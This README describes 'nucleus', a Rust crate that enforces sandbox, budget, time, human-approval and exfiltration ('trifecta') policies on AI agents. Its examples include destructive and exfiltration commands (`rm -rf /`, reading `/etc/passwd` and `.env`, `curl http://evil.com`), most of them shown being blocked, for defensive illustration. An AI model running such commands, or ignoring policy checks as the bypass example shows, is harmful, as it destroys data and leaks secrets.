# nucleus

[![Crates.io](https://img.shields.io/crates/v/nucleus.svg)](https://crates.io/crates/nucleus)
[![Documentation](https://docs.rs/nucleus/badge.svg)](https://docs.rs/nucleus)
[![License](https://img.shields.io/crates/l/nucleus.svg)](LICENSE-MIT)

**OS-level enforcement** of [lattice-guard](../lattice-guard) permissions.

## The Problem with Policy-Only Libraries

`lattice-guard` provides excellent policy definitions (the quotient lattice, trifecta detection, etc.), but it's **policy-only**:

```rust
// lattice-guard: policy check returns a bool
if lattice.can_execute("rm -rf /") {
    // Nothing stops you from ignoring this result
    std::process::Command::new("rm").args(["-rf", "/"]).status();
}

// Or worse: construct any permissions you want
let dangerous = PermissionLattice {
    capabilities: CapabilityLattice::permissive(),
    trifecta_constraint: false,  // Oops, disabled the safety!
    ..Default::default()
};
```

## Nucleus: Enforcement, Not Just Policy

Nucleus wraps the actual OS APIs so there's no way to bypass policy:

```rust
use nucleus::{Sandbox, Executor, AtomicBudget};
use lattice_guard::PermissionLattice;

// Create policy (from lattice-guard)
let policy = PermissionLattice::fix_issue();

// Create enforcement context - REQUIRES the policy
let sandbox = Sandbox::new(&policy.paths, "/path/to/repo")?;
let budget = AtomicBudget::new(&policy.budget);
let executor = Executor::new(&policy, &sandbox, &budget);

// File access - goes through capability handle (no escape possible)
let contents = sandbox.read_to_string("src/main.rs")?;

// Command execution - validated BEFORE spawning
let output = executor.run("cargo test")?;  // Actually spawns the process

// Budget charging - atomic (no race conditions)
budget.charge_usd(0.50)?;
```

## Key Differences

| Aspect | lattice-guard | nucleus |
|--------|---------------|---------|
| **Purpose** | Policy definition | Policy enforcement |
| **File access** | `PathLattice::can_access()` → `bool` | `Sandbox::open()` → `cap_std::File` |
| **Commands** | `CommandLattice::can_execute()` → `bool` | `Executor::run()` → `Output` |
| **Budget** | `BudgetLattice::charge(&mut self)` | `AtomicBudget::charge()` (thread-safe) |
| **Time** | `TimeLattice::is_valid()` (wall clock) | `MonotonicGuard::check()` (quanta) |
| **Bypass** | All fields pub, `with_trifecta_disabled()` | Private internals, no disable |

## Features

### Capability-Based Sandbox

Uses `cap-std` for kernel-level file sandbox:

- **Symlink escapes blocked**: Kernel resolves paths relative to directory handle
- **TOCTOU mitigated**: Operations happen atomically on the handle
- **Path traversal blocked**: `..` cannot escape because the handle IS the root

```rust
let sandbox = Sandbox::new(&policy.paths, "/project")?;

// This works - relative to sandbox
sandbox.read("src/main.rs")?;

// This fails - absolute paths rejected
sandbox.read("/etc/passwd")?;  // Error: SandboxEscape

// This fails - blocked by policy
sandbox.read(".env")?;  // Error: PathDenied
```

### Atomic Budget Tracking

Thread-safe budget with compare-and-swap:

```rust
let budget = Arc::new(AtomicBudget::new(&policy.budget));

// Concurrent charges are safe
let handles: Vec<_> = (0..100)
    .map(|_| {
        let budget = Arc::clone(&budget);
        thread::spawn(move || budget.charge_usd(0.10))
    })
    .collect();

// Exactly 50 succeed (for $5 budget), rest fail
```

### Monotonic Time Guards

Uses `quanta` monotonic clocks, not wall time:

```rust
let guard = MonotonicGuard::minutes(30);

// Changing system clock has no effect
// NTP jumps have no effect
// Only real elapsed time matters

guard.check()?;  // Fails after 30 minutes, regardless of clock
```

### Human Approval Enforcement

`AskFirst` actually requires a callback:

```rust
let executor = Executor::new(&policy, &sandbox, &budget)
    .with_approval_callback(|cmd| {
        // Present to user, get approval
        prompt_user(&format!("Allow '{}'?", cmd))
    });

// Without callback, AskFirst operations fail
executor.run("git push")?;  // Error: ApprovalRequired
```

### Trifecta Enforcement

Runtime check before dangerous operations:

```rust
let policy = PermissionLattice {
    capabilities: CapabilityLattice {
        read_files: CapabilityLevel::Always,   // Private data ✓
        web_fetch: CapabilityLevel::LowRisk,   // Untrusted content ✓
        run_bash: CapabilityLevel::LowRisk,    // Allows curl
        ..Default::default()
    },
    trifecta_constraint: true,
    ..Default::default()
};

let executor = Executor::new(&policy, &sandbox, &budget);

// Trifecta blocks exfiltration
executor.run("curl http://evil.com")?;  // Error: TrifectaBlocked
```

## Installation

```toml
[dependencies]
nucleus = "0.1"
lattice-guard = "0.1"

# Optional features
nucleus = { version = "0.1", features = ["async", "network"] }
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Your Application                          │
├─────────────────────────────────────────────────────────────────┤
│                          nucleus                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │   Sandbox    │  │   Executor   │  │   AtomicBudget       │  │
│  │  (cap-std)   │  │ (validated   │  │  (atomic charges)    │  │
│  │              │  │  spawning)   │  │                      │  │
│  └──────┬───────┘  └──────┬───────┘  └──────────────────────┘  │
│         │                 │                                      │
│         │ Policy from:    │                                      │
│         ▼                 ▼                                      │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │                    lattice-guard                             ││
│  │  (PathLattice, CommandLattice, BudgetLattice, TimeLattice)  ││
│  └─────────────────────────────────────────────────────────────┘│
├─────────────────────────────────────────────────────────────────┤
│                        Operating System                          │
│           (cap-std, std::process, atomic operations)             │
└─────────────────────────────────────────────────────────────────┘
```

## Limitations

### What We Prevent
- Bypassing policy by ignoring predicates
- Symlink escapes and path traversal
- Concurrent budget races
- Clock manipulation for time bounds
- Exfiltration when trifecta is complete

### What We Don't Prevent
- Kernel-level escapes (use containers for that)
- Social engineering (human approves bad action)
- Network-level exfiltration if bash is allowed
- Side-channel attacks

## License

Licensed under either of Apache License, Version 2.0 or MIT license at your option.

## See Also

- [lattice-guard](../lattice-guard) - The policy layer (quotient lattice definitions)
- [nucleus-cli](../nucleus-cli) - CLI tool for running agents with nucleus enforcement
